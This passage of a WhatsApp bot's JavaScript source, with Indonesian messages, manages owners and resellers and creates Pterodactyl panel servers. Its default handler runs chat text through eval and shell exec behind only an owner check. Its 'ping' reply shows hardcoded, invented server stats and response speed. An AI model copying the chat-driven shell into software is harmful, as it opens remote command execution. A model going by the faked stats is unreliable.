            (m.mentionedJid && m.mentionedJid[0]) ||
            m.sender;

        if (!input) return m.reply(`Tidak bisa mendeteksi JID target.`);

        const jid = input.split("@")[0];
        const botNumber = Xzyy.user.id.split(":")[0] + "@s.whatsapp.net";

        // validasi duplikat atau owner
        if (jid == global.owner || input == botNumber)
            return m.reply(`Nomor ${jid} sudah menjadi ownerbot.`);
        if (Own.includes(input))
            return m.reply(`Nomor ${jid} sudah terdaftar sebagai ownerbot.`);

        // tambahkan ke developer.json
        Own.push(input);
        fs.writeFileSync(devFile, JSON.stringify(Own, null, 2));

        // ubah status key jadi used
        keys[keyIndex].used = true;
        keys[keyIndex].usedAt = Date.now();
        keys[keyIndex].usedBy = input;
        fs.writeFileSync(keysFile, JSON.stringify(keys, null, 2));

        await m.reply(`✅ *Berhasil menambah owner:*\n- ${jid}\n\n🔑 Key telah digunakan & status diperbarui di keys.json.`);
    } catch (err) {
        console.error(err);
        m.reply(`❌ Terjadi kesalahan: ${err.message}`);
    }
}
break;

case "ping": case "uptime": {
let respon = `
*🔴 INFORMATION SERVER*

*• Total Ram :* 31.21 GB
*• Total Disk :* 4082.82 GB
*• Total Cpu :* Premium-AMD (8 Core)

*🔵 INFORMATION BOTZ*

*• Respon Speed :* 0.00021 detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

case "listadmin": {
    if (!isCreator) return m.reply(mess.owner);

    try {
        const res = await fetch(`${domain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            }
        });

        const data = await res.json();
        const users = data.data;

        const adminUsers = users.filter(u => u.attributes.root_admin === true);
        if (adminUsers.length < 1) return m.reply("Tidak ada admin panel.");

        let teks = `\n*Total admin panel :* ${adminUsers.length}\n`
        adminUsers.forEach((admin, idx) => {
            teks += `
- ID : *${admin.attributes.id}*
- Nama : *${admin.attributes.first_name}*
- Created : ${admin.attributes.created_at.split("T")[0]}
`;
        });

        await m.reply(teks)

    } catch (err) {
        console.error(err);
        m.reply("Terjadi kesalahan saat mengambil data admin.");
    }
}
break;

case "addseller": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text && !m.quoted) return m.reply(`*contoh:* ${cmd} 6283XXX`);

    const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || Reseller.includes(input) || input === botNumber)
        return m.reply(`Nomor ${input2} sudah menjadi reseller!`);

    Reseller.push(input);
    fs.writeFileSync("./Data/reseller.json", JSON.stringify(Reseller, null, 2));

    m.reply(`Berhasil menambah reseller ✅`);
}
break;

case "listseller": {
    if (Reseller.length < 1) return m.reply("Tidak ada user reseller");

    let teks = ``;
    for (let i of Reseller) {
        const num = i.split("@")[0];
        teks += `\n* ${num}\n* *Tag :* @${num}\n`;
    }

    Xzyy.sendMessage(m.chat, { text: teks, mentions: Reseller }, { quoted: m });
}
break;

case "delseller": {
    if (!isCreator) return m.reply(mess.owner);
    if (!m.quoted && !text) return m.reply(`*Contoh :* ${cmd} 6283XXX`);

    const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 == global.owner || input == botNumber)
        return m.reply(`Tidak bisa menghapus owner!`);

    if (!Reseller.includes(input))
        return m.reply(`Nomor ${input2} bukan reseller!`);

    Reseller.splice(Reseller.indexOf(input), 1);
    fs.writeFileSync("./Data/reseller.json", JSON.stringify(Reseller, null, 2));

    m.reply(`Berhasil menghapus reseller ✅`);
}
break;

case "own": case "owner": {
await Xzyy.sendContact(m.chat, [global.owner], global.namaOwner, "Developer Bot", m)
}
break

case "addowner": case "addown": {
if (!isCreator) return m.reply(mess.owner)
let input = m.quoted ? m.quoted.sender : m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : null
if (!input) return m.reply(`*Contoh penggunaan :*
ketik ${cmd} 6285XXX`)
let jid = input.split("@")[0]
const botNumber = Xzyy.user.id.split(":")[0] + "@s.whatsapp.net"
if (jid == global.owner || input == botNumber) return m.reply(`Nomor ${jid} sudah menjadi ownerbot.`)
const Own = Developer
if (Own.includes(input)) return m.reply(`Nomor ${jid} sudah menjadi ownerbot.`)
Own.push(input)
await fs.writeFileSync("./Data/developer.json", JSON.stringify(Own, null, 2))
await m.reply(`Berhasil menambah owner ✅
- ${input.split("@")[0]}`)
}
break

case "delowner": case "delown": {
if (!isCreator) return m.reply(mess.owner)
let input = m.quoted ? m.quoted.sender : m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : null
if (!input) return m.reply(`*Contoh penggunaan :*
ketik ${cmd} 6285XXX`)
const Own = Developer
    if (input.toLowerCase() === "all") {
        Own.length = 0
        await fs.writeFileSync("./Data/developer.json", JSON.stringify(Own, null, 2))
        return m.reply("Berhasil menghapus semua owner ✅")
    }
    if (!Own.includes(input)) return m.reply("Nomor tidak ditemukan!")
    const index = Own.indexOf(input)
    Own.splice(index, 1)
    await fs.writeFileSync("./Data/developer.json", JSON.stringify(Own, null, 2))
await m.reply(`Berhasil menghapus owner ✅
- ${input.split("@")[0]}`)
}
break

case "listowner": case "listown": {
const Own = JSON.parse(fs.readFileSync("./Data/developer.json"))
if (Own.length < 1) return m.reply("Tidak ada owner tambahan.")
let teks = ""
for (let i of Own) {
teks += `\n- Number: ${i.split("@")[0]}
- Tag: @${i.split("@")[0]}\n`
}
return m.reply(teks)
}
break
case "addserver": {
  if (!isCreator && !isReseller) return m.reply("❗ *Akses Ditolak*\nFitur hanya untuk `Owner`");
  if (!text) return m.reply(`*Contoh penggunaan :*\n${cmd} userid|username|plan`);
  let [userid, username, plan] = text.split("|");
  if (!userid || !username || !plan) return m.reply(`Contoh penggunaan :\n${cmd} userid|username|plan`);
  
  // Mapping RAM, Disk, dan CPU
  const resourceMap = {
    "1gb": { ram: 1024, disk: 1024, cpu: 100 },
    "2gb": { ram: 2048, disk: 2048, cpu: 150 },
    "3gb": { ram: 3072, disk: 3072, cpu: 200 },
    "4gb": { ram: 4096, disk: 4096, cpu: 250 },
    "5gb": { ram: 5120, disk: 5120, cpu: 300 },
    "00gb": { ram: 0, disk: 0, cpu: 0 }
  };
  
  let { ram, disk, cpu } = resourceMap[plan.toLowerCase()];
  if (!ram) return m.reply("Plan tidak ditemukan!");
  let startup_cmd = "npm start"; 
  
  let serverName = `${username}`;
  
  try {
    let f = await fetch(domain + "/api/application/servers", {
      method: "POST",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + apikey
      },
      body: JSON.stringify({
        name: serverName,
        description: tanggal(Date.now()),
        user: parseInt(userid), // Menggunakan parseInt untuk memastikan ID adalah angka
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_21",
        startup: startup_cmd,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start"
        },
        limits: {
          memory: ram,
          swap: 0,
          disk,
          io: 500,
          cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 5
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    let result = await f.json();
    if (result.errors) return m.reply("Error: " + JSON.stringify(result.errors[0], null, 2));
    m.reply(`Berhasil menambahkan server baru dengan nama ${serverName} dan ID ${result.attributes.id}`);
  } catch (err) {
    m.reply("Terjadi kesalahan: " + err.message);
  }
  break;
}

default:
if (m.text.toLowerCase().startsWith("xx")) {
    if (!isCreator) return;

    try {
        const result = await eval(`(async () => { ${text} })()`);
        const output = typeof result !== "string" ? util.inspect(result) : result;
        return Xzyy.sendMessage(m.chat, { text: util.format(output) }, { quoted: m });
    } catch (err) {
        return Xzyy.sendMessage(m.chat, { text: util.format(err) }, { quoted: m });
    }
}

if (m.text.toLowerCase().startsWith("x")) {
    if (!isCreator) return;

    try {
        let result = await eval(text);
        if (typeof result !== "string") result = util.inspect(result);
        return Xzyy.sendMessage(m.chat, { text: util.format(result) }, { quoted: m });
    } catch (err) {
        return Xzyy.sendMessage(m.chat, { text: util.format(err) }, { quoted: m });
    }
}

if (m.text.startsWith('$')) {
    if (!isCreator) return;
    
    exec(m.text.slice(2), (err, stdout) => {
        if (err) {
            return Xzyy.sendMessage(m.chat, { text: err.toString() }, { quoted: m });
        }
        if (stdout) {
            return Xzyy.sendMessage(m.chat, { text: util.format(stdout) }, { quoted: m });
        }
    });
}

}

} catch (err) {
console.log(err)
await Xzyy.sendMessage(global.owner+"@s.whatsapp.net", {text: err.toString()}, {quoted: m ? m : null })
}}

//=============================================//

process.on("uncaughtException", (err) => {
console.error("Caught exception:", err);
});


let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(chalk.blue(">> Update File:"), chalk.black.bgWhite(__filename));
    delete require.cache[file];
    require(file);
});